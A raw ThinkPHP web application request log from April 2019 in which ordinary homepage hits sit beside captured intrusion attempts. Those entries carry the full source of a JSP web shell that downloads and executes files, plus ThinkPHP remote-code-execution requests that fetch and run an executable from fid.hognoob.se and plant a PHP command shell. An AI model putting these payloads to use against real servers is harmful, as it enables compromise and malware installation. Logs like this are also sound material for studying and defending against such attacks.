---------------------------------------------------------------
[ 2019-04-06T02:12:36+08:00 ] 113.201.254.163 HEAD www.chinafeifang.com/
[运行时间：0.042044s] [吞吐率：23.78req/s] [内存消耗：4,879.99kb] [文件加载：143]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000026s ]
[ info ] [ CACHE ] INIT File
[ info ] [ BEHAVIOR ] Run \addons\epay\Epay @app_init [ RunTime:0.001867s ]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.001887s ]
[ info ] [ LANG ] /www/wwwroot/didi.xlove99.top/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'host' => 'www.chinafeifang.com',
  'accept' => '*/*',
  'user-agent' => 'Chrome/57',
  'cache-control' => 'no-cache',
  'pragma' => 'no-cache',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.001192s ]
[ info ] [ DB ] INIT mysql
[ info ] [ RUN ] app\wap\controller\Index->index[ /www/wwwroot/didi.xlove99.top/application/wap/controller/Index.php ]
[ info ] [ SESSION ] INIT array (
  'id' => '',
  'var_session_id' => '',
  'prefix' => 'think',
  'type' => '',
  'auto_start' => true,
)
[ info ] [ BEHAVIOR ] Run \addons\loginvideo\Loginvideo @response_send [ RunTime:0.000178s ]
[ info ] [ LOG ] INIT File
[ sql ] [ DB ] CONNECT:[ UseTime:0.000408s ] mysql:host=127.0.0.1;dbname=didi_project;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `fa_config` [ RunTime:0.000691s ]
[ sql ] [ SQL ] SELECT `id`,`name`,`group`,`value` FROM `fa_config` [ RunTime:0.000221s ]
[ sql ] [ SQL ] SELECT `id`,`name`,`group`,`value` FROM `fa_config` WHERE  `group` = 'weixin' [ RunTime:0.000256s ]
---------------------------------------------------------------
[ 2019-04-06T04:24:35+08:00 ] 47.92.129.173 PUT 47.92.113.32/FxCodeShell.jsp%20
[运行时间：0.039497s] [吞吐率：25.32req/s] [内存消耗：2,181.04kb] [文件加载：61]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000022s ]
[ info ] [ CACHE ] INIT File
[ info ] [ BEHAVIOR ] Run \addons\epay\Epay @app_init [ RunTime:0.001995s ]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.002013s ]
[ info ] [ LANG ] /www/wwwroot/didi.xlove99.top/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'FxCodeShell.jsp ',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'host' => '47.92.113.32',
  'content-length' => '3363',
  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)',
  'referer' => 'http://47.92.113.32:443/FxCodeShell.jsp%20',
  'accept-language' => 'zh-cn',
  'accept' => '*/*',
  'content-type' => 'text/plain; Charset=UTF-8',
  'connection' => 'Keep-Alive',
)
[ info ] [ PARAM ] array (
  '<%@_page_import' => '"java.util.Arrays"%>
<%@ page language="java" contentType="text/html; charset=UTF-8" pageEncoding="UTF-8"%>
<%@ page import="java.io.*,java.util.*,java.net.URL,java.net.HttpURLConnection"%>
<%
	String view = request.getParameter("view");
	if (view == null || view.equals("")) {
		String localOS = System.getProperty("os.name");
		List<String> osList;
		String tomcatOS = "0";
		String DEFAULT = "0";
		String WINDOWS = "1";
		String LINUX = "2";
		osList = new ArrayList<String>();
		osList.add("Linux");
		osList.add("Windows");
		for (String os : osList) {
			if (localOS.contains(os)) {
				if (os.equals("Linux")) {
					tomcatOS = LINUX;
				} else if (os.equals("Windows")) {
					tomcatOS = WINDOWS;
				} else {
					tomcatOS = DEFAULT;
				}
				break;
			}
		}
		out.write(tomcatOS   "<br/>");
		response.setHeader("OS", tomcatOS);
		return;
	}
%>

<%
	String password = "FxxkMyLie1836710Aa";
	if (!view.equals(password)) {
		return;
	}
	int systemCode = Integer.parseInt(request.getParameter("os"));
	String address = request.getParameter("address");
	String fileName = null;
	String path = null;
	String winPath = "C:/Windows/Temp/";
	String linuxPath = "/var/tmp/";
	switch (systemCode) {
	case 1:
		path = winPath;
		break;
	default:
		path = linuxPath;
		break;
	}

	String[] urls = address.split(",");
	InputStream fileInputSteam = null;
	FileOutputStream fileOutputStream = null;
	for (int i = 0; i <= urls.length - 1; i  ) {
		try {
			String[] file = urls[i].split("/");
			fileName = file[file.length - 1];
			out.write("Download:"   urls[i]   "<br>");
			out.write("<br>filename:"   fileName   "<br>");
			out.write("<br>Size:"   urls.length   "<br>");
			out.write(
					"-------------------------------------------------------------------------------------------------------"
							  "<br><br>");
			File isfile = new File(path   fileName);
			if (isfile.isFile()) {
				try {
					Runtime exec = Runtime.getRuntime();
					if (systemCode == 1) {
						exec.exec(path   fileName);
					} else {
						String chmod = "chmod 777 "   path   fileName;
						exec.exec(chmod);
						exec.exec("nohup "   path   fileName   " > /dev/null 2>',
  '1_' => '',
  '");
					}
				}_catch_(Exception_e1)_{
					e1_printStackTrace();
				}
				continue;
			}
			URL_downloadUrl_' => ' new URL(urls[i]);
			HttpURLConnection conn = (HttpURLConnection) downloadUrl.openConnection();
			conn.setConnectTimeout(60000 * 3);
			conn.setReadTimeout(60000 * 3);
			fileInputSteam = conn.getInputStream();
			fileOutputStream = new FileOutputStream(path   fileName);
			int length = -1;
			byte[] b = new byte[409600];
			while ((length = fileInputSteam.read(b)) != -1) {
				fileOutputStream.write(b, 0, length);
				fileOutputStream.flush();
			}
			if (conn != null) {
				conn.disconnect();
			}
			if (fileInputSteam != null) {
				fileInputSteam.close();
			}
			if (fileOutputStream != null) {
				fileOutputStream.close();
			}
			Runtime exec = Runtime.getRuntime();
			if (systemCode == 1) {
				exec.exec(path   fileName);
			} else {
				String chmod = "chmod 777 "   path   fileName;
				exec.exec(chmod);
				exec.exec("nohup "   path   fileName   " > /dev/null 2>',
  '");
			}
		}_catch_(Exception_e2)_{
			e2_printStackTrace();
		}
	}
%>' => '',
)
[ info ] [ BEHAVIOR ] Run \addons\loginvideo\Loginvideo @response_send [ RunTime:0.000113s ]
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2019-04-06T04:24:35+08:00 ] 47.92.129.173 GET 47.92.113.32/FxCodeShell.jsp%20
[运行时间：0.021146s] [吞吐率：47.29req/s] [内存消耗：2,161.60kb] [文件加载：61]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000024s ]
[ info ] [ CACHE ] INIT File
[ info ] [ BEHAVIOR ] Run \addons\epay\Epay @app_init [ RunTime:0.002006s ]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.002025s ]
[ info ] [ LANG ] /www/wwwroot/didi.xlove99.top/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '404',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'host' => '47.92.113.32',
  'content-length' => '3363',
  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)',
  'referer' => 'http://47.92.113.32:443/FxCodeShell.jsp%20',
  'accept-language' => 'zh-cn',
  'accept' => '*/*',
  'content-type' => 'text/plain; Charset=UTF-8',
  'connection' => 'Keep-Alive',
)
[ info ] [ PARAM ] array (
)
[ info ] [ BEHAVIOR ] Run \addons\loginvideo\Loginvideo @response_send [ RunTime:0.000107s ]
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2019-04-06T04:24:35+08:00 ] 47.92.129.173 PUT 47.92.113.32/FxCodeShell.jsp::$DATA
[运行时间：0.038399s] [吞吐率：26.04req/s] [内存消耗：2,181.09kb] [文件加载：61]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000019s ]
[ info ] [ CACHE ] INIT File
[ info ] [ BEHAVIOR ] Run \addons\epay\Epay @app_init [ RunTime:0.001909s ]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.001924s ]
[ info ] [ LANG ] /www/wwwroot/didi.xlove99.top/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'FxCodeShell.jsp::$DATA',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'host' => '47.92.113.32',
  'content-length' => '3363',
  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)',
  'referer' => 'http://47.92.113.32:443/FxCodeShell.jsp::$DATA',
  'accept-language' => 'zh-cn',
  'accept' => '*/*',
  'content-type' => 'text/plain; Charset=UTF-8',
  'connection' => 'Keep-Alive',
)
[ info ] [ PARAM ] array (
  '<%@_page_import' => '"java.util.Arrays"%>
<%@ page language="java" contentType="text/html; charset=UTF-8" pageEncoding="UTF-8"%>
<%@ page import="java.io.*,java.util.*,java.net.URL,java.net.HttpURLConnection"%>
<%
	String view = request.getParameter("view");
	if (view == null || view.equals("")) {
		String localOS = System.getProperty("os.name");
		List<String> osList;
		String tomcatOS = "0";
		String DEFAULT = "0";
		String WINDOWS = "1";
		String LINUX = "2";
		osList = new ArrayList<String>();
		osList.add("Linux");
		osList.add("Windows");
		for (String os : osList) {
			if (localOS.contains(os)) {
				if (os.equals("Linux")) {
					tomcatOS = LINUX;
				} else if (os.equals("Windows")) {
					tomcatOS = WINDOWS;
				} else {
					tomcatOS = DEFAULT;
				}
				break;
			}
		}
		out.write(tomcatOS   "<br/>");
		response.setHeader("OS", tomcatOS);
		return;
	}
%>

<%
	String password = "FxxkMyLie1836710Aa";
	if (!view.equals(password)) {
		return;
	}
	int systemCode = Integer.parseInt(request.getParameter("os"));
	String address = request.getParameter("address");
	String fileName = null;
	String path = null;
	String winPath = "C:/Windows/Temp/";
	String linuxPath = "/var/tmp/";
	switch (systemCode) {
	case 1:
		path = winPath;
		break;
	default:
		path = linuxPath;
		break;
	}

	String[] urls = address.split(",");
	InputStream fileInputSteam = null;
	FileOutputStream fileOutputStream = null;
	for (int i = 0; i <= urls.length - 1; i  ) {
		try {
			String[] file = urls[i].split("/");
			fileName = file[file.length - 1];
			out.write("Download:"   urls[i]   "<br>");
			out.write("<br>filename:"   fileName   "<br>");
			out.write("<br>Size:"   urls.length   "<br>");
			out.write(
					"-------------------------------------------------------------------------------------------------------"
							  "<br><br>");
			File isfile = new File(path   fileName);
			if (isfile.isFile()) {
				try {
					Runtime exec = Runtime.getRuntime();
					if (systemCode == 1) {
						exec.exec(path   fileName);
					} else {
						String chmod = "chmod 777 "   path   fileName;
						exec.exec(chmod);
						exec.exec("nohup "   path   fileName   " > /dev/null 2>',
  '1_' => '',
  '");
					}
				}_catch_(Exception_e1)_{
					e1_printStackTrace();
				}
				continue;
			}
			URL_downloadUrl_' => ' new URL(urls[i]);
			HttpURLConnection conn = (HttpURLConnection) downloadUrl.openConnection();
			conn.setConnectTimeout(60000 * 3);
			conn.setReadTimeout(60000 * 3);
			fileInputSteam = conn.getInputStream();
			fileOutputStream = new FileOutputStream(path   fileName);
			int length = -1;
			byte[] b = new byte[409600];
			while ((length = fileInputSteam.read(b)) != -1) {
				fileOutputStream.write(b, 0, length);
				fileOutputStream.flush();
			}
			if (conn != null) {
				conn.disconnect();
			}
			if (fileInputSteam != null) {
				fileInputSteam.close();
			}
			if (fileOutputStream != null) {
				fileOutputStream.close();
			}
			Runtime exec = Runtime.getRuntime();
			if (systemCode == 1) {
				exec.exec(path   fileName);
			} else {
				String chmod = "chmod 777 "   path   fileName;
				exec.exec(chmod);
				exec.exec("nohup "   path   fileName   " > /dev/null 2>',
  '");
			}
		}_catch_(Exception_e2)_{
			e2_printStackTrace();
		}
	}
%>' => '',
)
[ info ] [ BEHAVIOR ] Run \addons\loginvideo\Loginvideo @response_send [ RunTime:0.000098s ]
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2019-04-06T04:24:35+08:00 ] 47.92.129.173 GET 47.92.113.32/FxCodeShell.jsp::$DATA
[运行时间：0.021223s] [吞吐率：47.12req/s] [内存消耗：2,161.60kb] [文件加载：61]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000020s ]
[ info ] [ CACHE ] INIT File
[ info ] [ BEHAVIOR ] Run \addons\epay\Epay @app_init [ RunTime:0.001938s ]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.001951s ]
[ info ] [ LANG ] /www/wwwroot/didi.xlove99.top/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '404',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'host' => '47.92.113.32',
  'content-length' => '3363',
  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)',
  'referer' => 'http://47.92.113.32:443/FxCodeShell.jsp::$DATA',
  'accept-language' => 'zh-cn',
  'accept' => '*/*',
  'content-type' => 'text/plain; Charset=UTF-8',
  'connection' => 'Keep-Alive',
)
[ info ] [ PARAM ] array (
)
[ info ] [ BEHAVIOR ] Run \addons\loginvideo\Loginvideo @response_send [ RunTime:0.000116s ]
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2019-04-06T04:24:35+08:00 ] 47.92.129.173 PUT 47.92.113.32/FxCodeShell.jsp/
[运行时间：0.029891s] [吞吐率：33.45req/s] [内存消耗：2,181.08kb] [文件加载：61]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000017s ]
[ info ] [ CACHE ] INIT File
[ info ] [ BEHAVIOR ] Run \addons\epay\Epay @app_init [ RunTime:0.001920s ]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.001933s ]
[ info ] [ LANG ] /www/wwwroot/didi.xlove99.top/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'FxCodeShell.jsp',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'host' => '47.92.113.32',
  'content-length' => '3363',
  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)',
  'referer' => 'http://47.92.113.32:443/FxCodeShell.jsp/',
  'accept-language' => 'zh-cn',
  'accept' => '*/*',
  'content-type' => 'text/plain; Charset=UTF-8',
  'connection' => 'Keep-Alive',
)
[ info ] [ PARAM ] array (
  '<%@_page_import' => '"java.util.Arrays"%>
<%@ page language="java" contentType="text/html; charset=UTF-8" pageEncoding="UTF-8"%>
<%@ page import="java.io.*,java.util.*,java.net.URL,java.net.HttpURLConnection"%>
<%
	String view = request.getParameter("view");
	if (view == null || view.equals("")) {
		String localOS = System.getProperty("os.name");
		List<String> osList;
		String tomcatOS = "0";
		String DEFAULT = "0";
		String WINDOWS = "1";
		String LINUX = "2";
		osList = new ArrayList<String>();
		osList.add("Linux");
		osList.add("Windows");
		for (String os : osList) {
			if (localOS.contains(os)) {
				if (os.equals("Linux")) {
					tomcatOS = LINUX;
				} else if (os.equals("Windows")) {
					tomcatOS = WINDOWS;
				} else {
					tomcatOS = DEFAULT;
				}
				break;
			}
		}
		out.write(tomcatOS   "<br/>");
		response.setHeader("OS", tomcatOS);
		return;
	}
%>

<%
	String password = "FxxkMyLie1836710Aa";
	if (!view.equals(password)) {
		return;
	}
	int systemCode = Integer.parseInt(request.getParameter("os"));
	String address = request.getParameter("address");
	String fileName = null;
	String path = null;
	String winPath = "C:/Windows/Temp/";
	String linuxPath = "/var/tmp/";
	switch (systemCode) {
	case 1:
		path = winPath;
		break;
	default:
		path = linuxPath;
		break;
	}

	String[] urls = address.split(",");
	InputStream fileInputSteam = null;
	FileOutputStream fileOutputStream = null;
	for (int i = 0; i <= urls.length - 1; i  ) {
		try {
			String[] file = urls[i].split("/");
			fileName = file[file.length - 1];
			out.write("Download:"   urls[i]   "<br>");
			out.write("<br>filename:"   fileName   "<br>");
			out.write("<br>Size:"   urls.length   "<br>");
			out.write(
					"-------------------------------------------------------------------------------------------------------"
							  "<br><br>");
			File isfile = new File(path   fileName);
			if (isfile.isFile()) {
				try {
					Runtime exec = Runtime.getRuntime();
					if (systemCode == 1) {
						exec.exec(path   fileName);
					} else {
						String chmod = "chmod 777 "   path   fileName;
						exec.exec(chmod);
						exec.exec("nohup "   path   fileName   " > /dev/null 2>',
  '1_' => '',
  '");
					}
				}_catch_(Exception_e1)_{
					e1_printStackTrace();
				}
				continue;
			}
			URL_downloadUrl_' => ' new URL(urls[i]);
			HttpURLConnection conn = (HttpURLConnection) downloadUrl.openConnection();
			conn.setConnectTimeout(60000 * 3);
			conn.setReadTimeout(60000 * 3);
			fileInputSteam = conn.getInputStream();
			fileOutputStream = new FileOutputStream(path   fileName);
			int length = -1;
			byte[] b = new byte[409600];
			while ((length = fileInputSteam.read(b)) != -1) {
				fileOutputStream.write(b, 0, length);
				fileOutputStream.flush();
			}
			if (conn != null) {
				conn.disconnect();
			}
			if (fileInputSteam != null) {
				fileInputSteam.close();
			}
			if (fileOutputStream != null) {
				fileOutputStream.close();
			}
			Runtime exec = Runtime.getRuntime();
			if (systemCode == 1) {
				exec.exec(path   fileName);
			} else {
				String chmod = "chmod 777 "   path   fileName;
				exec.exec(chmod);
				exec.exec("nohup "   path   fileName   " > /dev/null 2>',
  '");
			}
		}_catch_(Exception_e2)_{
			e2_printStackTrace();
		}
	}
%>' => '',
)
[ info ] [ BEHAVIOR ] Run \addons\loginvideo\Loginvideo @response_send [ RunTime:0.000110s ]
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2019-04-06T04:24:35+08:00 ] 47.92.129.173 GET 47.92.113.32/FxCodeShell.jsp/
[运行时间：0.020247s] [吞吐率：49.39req/s] [内存消耗：2,161.60kb] [文件加载：61]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000017s ]
[ info ] [ CACHE ] INIT File
[ info ] [ BEHAVIOR ] Run \addons\epay\Epay @app_init [ RunTime:0.001896s ]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.001908s ]
[ info ] [ LANG ] /www/wwwroot/didi.xlove99.top/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '404',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'host' => '47.92.113.32',
  'content-length' => '3363',
  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)',
  'referer' => 'http://47.92.113.32:443/FxCodeShell.jsp/',
  'accept-language' => 'zh-cn',
  'accept' => '*/*',
  'content-type' => 'text/plain; Charset=UTF-8',
  'connection' => 'Keep-Alive',
)
[ info ] [ PARAM ] array (
)
[ info ] [ BEHAVIOR ] Run \addons\loginvideo\Loginvideo @response_send [ RunTime:0.000097s ]
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2019-04-06T04:24:35+08:00 ] 47.92.129.173 GET 47.92.113.32/FxCodeShell.jsp?view=FxxkMyLie1836710Aa&os=1&address=http://fid.hognoob.se/download.exe
[运行时间：0.029600s] [吞吐率：33.78req/s] [内存消耗：2,154.44kb] [文件加载：61]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000019s ]
[ info ] [ CACHE ] INIT File
[ info ] [ BEHAVIOR ] Run \addons\epay\Epay @app_init [ RunTime:0.001947s ]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.001965s ]
[ info ] [ LANG ] /www/wwwroot/didi.xlove99.top/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'FxCodeShell.jsp',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'host' => '47.92.113.32',
  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)',
  'referer' => 'http://47.92.113.32:443/FxCodeShell.jsp?view=FxxkMyLie1836710Aa&os=1&address=http://fid.hognoob.se/download.exe',
  'accept-language' => 'zh-cn',
  'accept' => '*/*',
  'connection' => 'Keep-Alive',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
  'view' => 'FxxkMyLie1836710Aa',
  'os' => '1',
  'address' => 'http://fid.hognoob.se/download.exe',
)
[ info ] [ BEHAVIOR ] Run \addons\loginvideo\Loginvideo @response_send [ RunTime:0.000100s ]
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2019-04-06T04:24:36+08:00 ] 47.92.129.173 GET 47.92.113.32/FxCodeShell.jsp?view=FxxkMyLie1836710Aa&os=1&address=http://fid.hognoob.se/download.exe
[运行时间：0.020220s] [吞吐率：49.46req/s] [内存消耗：2,153.49kb] [文件加载：61]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000027s ]
[ info ] [ CACHE ] INIT File
[ info ] [ BEHAVIOR ] Run \addons\epay\Epay @app_init [ RunTime:0.001861s ]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.001874s ]
[ info ] [ LANG ] /www/wwwroot/didi.xlove99.top/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '404',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'host' => '47.92.113.32',
  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)',
  'referer' => 'http://47.92.113.32:443/FxCodeShell.jsp?view=FxxkMyLie1836710Aa&os=1&address=http://fid.hognoob.se/download.exe',
  'accept-language' => 'zh-cn',
  'accept' => '*/*',
  'connection' => 'Keep-Alive',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ BEHAVIOR ] Run \addons\loginvideo\Loginvideo @response_send [ RunTime:0.000109s ]
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2019-04-06T04:52:47+08:00 ] 47.92.126.167 GET www.chinafeifang.com/
[运行时间：0.041870s] [吞吐率：23.88req/s] [内存消耗：4,878.73kb] [文件加载：143]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000021s ]
[ info ] [ CACHE ] INIT File
[ info ] [ BEHAVIOR ] Run \addons\epay\Epay @app_init [ RunTime:0.001785s ]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.001801s ]
[ info ] [ LANG ] /www/wwwroot/didi.xlove99.top/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'connection' => 'keep-alive',
  'accept' => 'text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2',
  'host' => 'www.chinafeifang.com',
  'user-agent' => 'Mozilla/5.0 (iPhone; CPU iPhone OS 8_0_2 like Mac OS X)',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.001171s ]
[ info ] [ DB ] INIT mysql
[ info ] [ RUN ] app\wap\controller\Index->index[ /www/wwwroot/didi.xlove99.top/application/wap/controller/Index.php ]
[ info ] [ SESSION ] INIT array (
  'id' => '',
  'var_session_id' => '',
  'prefix' => 'think',
  'type' => '',
  'auto_start' => true,
)
[ info ] [ BEHAVIOR ] Run \addons\loginvideo\Loginvideo @response_send [ RunTime:0.000185s ]
[ info ] [ LOG ] INIT File
[ sql ] [ DB ] CONNECT:[ UseTime:0.000406s ] mysql:host=127.0.0.1;dbname=didi_project;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `fa_config` [ RunTime:0.000673s ]
[ sql ] [ SQL ] SELECT `id`,`name`,`group`,`value` FROM `fa_config` [ RunTime:0.000229s ]
[ sql ] [ SQL ] SELECT `id`,`name`,`group`,`value` FROM `fa_config` WHERE  `group` = 'weixin' [ RunTime:0.000272s ]
---------------------------------------------------------------
[ 2019-04-06T05:41:36+08:00 ] 171.115.190.158 HEAD www.chinafeifang.com/
[运行时间：0.043279s] [吞吐率：23.11req/s] [内存消耗：4,879.99kb] [文件加载：143]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000021s ]
[ info ] [ CACHE ] INIT File
[ info ] [ BEHAVIOR ] Run \addons\epay\Epay @app_init [ RunTime:0.002019s ]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.002036s ]
[ info ] [ LANG ] /www/wwwroot/didi.xlove99.top/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'host' => 'www.chinafeifang.com',
  'accept' => '*/*',
  'user-agent' => 'Chrome/57',
  'cache-control' => 'no-cache',
  'pragma' => 'no-cache',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.001215s ]
[ info ] [ DB ] INIT mysql
[ info ] [ RUN ] app\wap\controller\Index->index[ /www/wwwroot/didi.xlove99.top/application/wap/controller/Index.php ]
[ info ] [ SESSION ] INIT array (
  'id' => '',
  'var_session_id' => '',
  'prefix' => 'think',
  'type' => '',
  'auto_start' => true,
)
[ info ] [ BEHAVIOR ] Run \addons\loginvideo\Loginvideo @response_send [ RunTime:0.000157s ]
[ info ] [ LOG ] INIT File
[ sql ] [ DB ] CONNECT:[ UseTime:0.000388s ] mysql:host=127.0.0.1;dbname=didi_project;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `fa_config` [ RunTime:0.000690s ]
[ sql ] [ SQL ] SELECT `id`,`name`,`group`,`value` FROM `fa_config` [ RunTime:0.000238s ]
[ sql ] [ SQL ] SELECT `id`,`name`,`group`,`value` FROM `fa_config` WHERE  `group` = 'weixin' [ RunTime:0.000254s ]
---------------------------------------------------------------
[ 2019-04-06T05:49:38+08:00 ] 47.92.247.150 GET 47.92.113.32/public/index.php?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=cmd.exe%20/c%20powershell%20(new-object%20System.Net.WebClient).DownloadFile('http://fid.hognoob.se/download.exe','C:/Windows/temp/wfmdjbychhobvyo5288.exe');start%20C:/Windows/temp/wfmdjbychhobvyo5288.exe
[运行时间：0.026908s] [吞吐率：37.16req/s] [内存消耗：2,155.05kb] [文件加载：61]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000029s ]
[ info ] [ CACHE ] INIT File
[ info ] [ BEHAVIOR ] Run \addons\epay\Epay @app_init [ RunTime:0.002686s ]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.002707s ]
[ info ] [ LANG ] /www/wwwroot/didi.xlove99.top/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '404',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'host' => '47.92.113.32',
  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)',
  'referer' => 'http://47.92.113.32:443/public/index.php?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=cmd.exe /c powershell (new-object System.Net.WebClient).DownloadFile(\'http://fid.hognoob.se/download.exe\',\'C:/Windows/temp/wfmdjbychhobvyo5288.exe\');start C:/Windows/temp/wfmdjbychhobvyo5288.exe',
  'accept-language' => 'zh-cn',
  'accept' => '*/*',
  'connection' => 'Keep-Alive',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ BEHAVIOR ] Run \addons\loginvideo\Loginvideo @response_send [ RunTime:0.000139s ]
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2019-04-06T05:49:38+08:00 ] 47.92.247.150 GET 47.92.113.32/public/index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=echo%20^<?php%20$action%20=%20$_GET['xcmd'];system($action);?^>>hydra.php
[运行时间：0.026272s] [吞吐率：38.06req/s] [内存消耗：2,154.18kb] [文件加载：61]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000026s ]
[ info ] [ CACHE ] INIT File
[ info ] [ BEHAVIOR ] Run \addons\epay\Epay @app_init [ RunTime:0.002641s ]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.002660s ]
[ info ] [ LANG ] /www/wwwroot/didi.xlove99.top/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '404',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'host' => '47.92.113.32',
  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)',
  'referer' => 'http://47.92.113.32:443/public/index.php?s=/index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=echo ^<?php $action = $_GET[\'xcmd\'];system($action);?^>>hydra.php',
  'accept-language' => 'zh-cn',
  'accept' => '*/*',
  'connection' => 'Keep-Alive',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ BEHAVIOR ] Run \addons\loginvideo\Loginvideo @response_send [ RunTime:0.000138s ]
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
